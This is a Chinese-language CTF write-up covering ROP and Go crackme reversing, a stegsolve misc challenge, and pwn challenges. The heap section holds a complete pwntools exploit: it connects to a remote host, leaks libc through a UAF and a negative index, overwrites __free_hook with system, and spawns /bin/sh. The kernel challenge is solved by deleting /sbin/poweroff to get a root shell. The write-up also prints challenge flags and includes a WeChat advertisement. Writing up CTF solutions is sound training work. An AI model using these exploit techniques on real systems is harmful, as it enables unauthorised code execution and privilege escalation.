## Reverse

### ROP

解析data的ROP，一点一点还原

    
    
    from pwn import *  
    opcode = open('data', 'rb').read()  
    opcode_gadget = opcode[0x30+8:]  
    for offset in range(0, len(opcode_gadget), 8):  
      print(f'{hex(u64(opcode_gadget[offset:offset+8]))}')

提取出来密文，转成64位的

    
    
    cipher = [0x98, 0x7A, 0xDF, 0x57, 0xC6, 0xE3, 0x18, 0xC7, 0x11, 0x07, 0xC7, 0xD4, 0x02, 0xD2, 0x9E,  
            0x43, 0x3A, 0xCE, 0x32, 0x04, 0x33, 0x2D, 0x30, 0x30, 0xAB, 0x03, 0x84, 0xB2, 0xA9, 0x09, 0xAA, 0x40]  
    cipher=[int.from_bytes(bytes(cipher[i:i+8]), 'little')  for i in range(0,32,8)]

分析gadget都是通过设置rax和参数寄存器，然后call rax触发函数，函数只有4种

![image.png](https://image.3001.net/images/20221011/1665499716_63458244a4a9f213d85a3.png!small)

流程是一开始将一个32位字符放到bss段中，这个bss贴近我们输入放入bss段的位置，参与到运算

然后开始rop链，读取42个字符，提取uuid中32位字符，进行加密运算，运算的最后一部分是swap的操作，测试得知顺序改变为`[2,3,0,1]`

最后对比密文跳转结果

照着指令写一个逆回来的过程

    
    
    #include <stdio.h>  
    #include <stdlib.h>  
    #include <stdint.h>  
    uint64_t bss_flag[] = {3472325009839672890, 4659547388917318571, 14346467054006008472, 4872562756463036177, 3545518422457791288, 3689401600665085541, 3906648618554712880, 7004559110426617186};  
    void add(int i,int j){  
      bss_flag[i] -= bss_flag[j];  
    }  
    ​  
    void sub(int i,int j){  
      bss_flag[i] += bss_flag[j];  
    }  
    ​  
    void xor1(int i,int j){  
      bss_flag[i] ^= bss_flag[j];  
    }  
    ​  
    int main(){  
      sub(0x0,0x7);  
      add(0x1,0x5);  
      sub(0x3,0x7);  
      add(0x0,0x5);  
      add(0x0,0x7);  
      sub(0x3,0x7);  
      add(0x0,0x5);  
      xor1(0x2,0x5);  
      xor1(0x2,0x5);  
      sub(0x3,0x7);  
      sub(0x2,0x6);  
      xor1(0x0,0x7);  
      add(0x2,0x4);  
      add(0x1,0x4);  
      xor1(0x1,0x7);  
      xor1(0x0,0x7);  
      sub(0x0,0x5);  
      sub(0x0,0x7);  
      sub(0x0,0x5);  
      add(0x1,0x7);  
      xor1(0x1,0x5);  
      add(0x1,0x6);  
      sub(0x1,0x4);  
      xor1(0x2,0x4);  
      add(0x1,0x4);  
      sub(0x0,0x6);  
      sub(0x2,0x7);  
      add(0x1,0x6);  
      sub(0x2,0x5);  
      add(0x0,0x7);  
      xor1(0x3,0x6);  
      add(0x2,0x4);  
      xor1(0x0,0x6);  
      xor1(0x0,0x5);  
      xor1(0x3,0x7);  
      xor1(0x0,0x4);  
      xor1(0x2,0x5);  
      xor1(0x2,0x6);  
      xor1(0x2,0x6);  
      xor1(0x3,0x4);  
      xor1(0x0,0x7);  
      xor1(0x2,0x5);  
      xor1(0x0,0x4);  
      xor1(0x3,0x5);  
      xor1(0x1,0x6);  
      xor1(0x3,0x7);  
      xor1(0x0,0x4);  
      xor1(0x1,0x4);  
      xor1(0x2,0x7);  
      xor1(0x1,0x7);  
      xor1(0x0,0x4);  
      xor1(0x2,0x6);  
      xor1(0x0,0x5);  
      xor1(0x1,0x7);  
      xor1(0x0,0x5);  
      xor1(0x0,0x4);  
      xor1(0x3,0x6);  
      xor1(0x1,0x7);  
      xor1(0x2,0x5);  
      xor1(0x0,0x7);  
      xor1(0x0,0x7);  
      xor1(0x2,0x4);  
      xor1(0x3,0x4);  
      xor1(0x3,0x7);  
      printf("%s",(char *)bss_flag);  
      // flag{eb4781b3-e3c5-475e-8af4-2fa50468f485}  
    }

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

### crackme

go语言，一开始我ida还f5反编译不了，换了个才可以，难顶

直接sm4加密和rc4，sm4密钥写死在代码里

![202210111406477.png](https://image.3001.net/images/20221011/1665499717_63458245958d7bd872dda.png!small)

rc4的key在linese.txt里，密文也在里面

exp:

    
    
    from binascii import unhexlify  
    from Crypto.Cipher import ARC4  
    from sm4 import SM4Key  
    ​  
    c= unhexlify(b'cc53de43058c79e4e13dbfe4e1ece82ec7d70b0fe460d50a6e2dfbbdac0b22173124ac7dee560b026b9b4cf1394c9493ad62874b4ef2125bbe27f99827d2a801b1b994c90bc31caea1cc9dc09362b518')  
    key = b'd0cac74c1bbeea071817360e491585e8'  
    cipher = ARC4.new(key)  
    m = cipher.decrypt(c)  
    key0 = SM4Key(b'xc08asb890ajds0a')  
    print(key0.decrypt(m))

## Misc

### What is that

stegsolve直接切换几个通道就可以看到

![202210111406478.png](https://image.3001.net/images/20221011/1665499718_63458246d0456f2811404.png!small)

## pwn

### hello

直接网上查到kernel pwn qemu 的非预期

ctrl+a然后c进入shell，cat flag没有权限，要再提权，删除`/sbin/poweroff`然后exit就可以到su权限，再cat
flag就可以

![202210111406479.png](https://image.3001.net/images/20221011/1665499720_634582486de435536f089.png!small)

### heap

一个UAF+数组上溢出

这里可以输入负数，可以数组溢出就可以往上泄露地址，泄露出程序基地址后再相同手法修改free_hook就可以。

![202210111406480.png](https://image.3001.net/images/20221011/1665499722_6345824a21c7b6847d361.png!small)

    
    
    from pwn import *  
    context.log_level='debug'  
    #p=process('./pwn')  
    p=remote('47.95.8.59',42283)  
    elf=ELF('./pwn')  
    #libc=ELF('/usr/lib/freelibs/amd64/2.27-3ubuntu1.5_amd64/libc.so.6')  
    libc=ELF('./libc.so.6')  
    ​  
    def add(size):  
      p.sendafter(b'>\n', b'1')  
      p.sendafter(b'add?\n', str(size).encode())  
    ​  
    def dele(index):  
      p.sendafter(b'>\n', b'2')  
      p.sendafter(b'up?\n', str(index).encode())  
    ​  
    def edit(index,size,content):  
      p.sendafter(b'>\n', b'3')  
      p.sendafter(b'write?\n', str(index).encode())  
      p.sendafter(b'write?\n', str(size).encode())  
      p.sendafter(b'Content:', content)  
    ​  
    def show(index):  
      p.sendafter(b'>\n', b'4')  
      p.sendafter(b'review?\n', str(index).encode())  
    ​  
    show(-11)  
    p.recvuntil('Content:')  
    probase=u64(p.recv(6).ljust(8,b'\x00'))-0x4008  
    arraddr=probase+0x4060  
    add(0x10)  
    add(0x10)  
    add(0x10)  
    dele(0)  
    dele(1)  
    dele(2)  
    edit(1,8,p64(arraddr))  
    add(0x10)  
    add(0x10)  
    add(0x10)  
    edit(2,8,p64(probase+elf.got['puts']))  
    show(0)  
    libc_base=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-libc.symbols['puts']  
    free_hook=libc_base+libc.symbols['__free_hook']  
    system=libc_base+libc.symbols['system']  
    edit(2,8,p64(free_hook))  
    edit(0,8,p64(system))  
    add(0x10)  
    edit(3,8,b'/bin/sh\x00')  
    dele(3)  
    p.interactive()

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

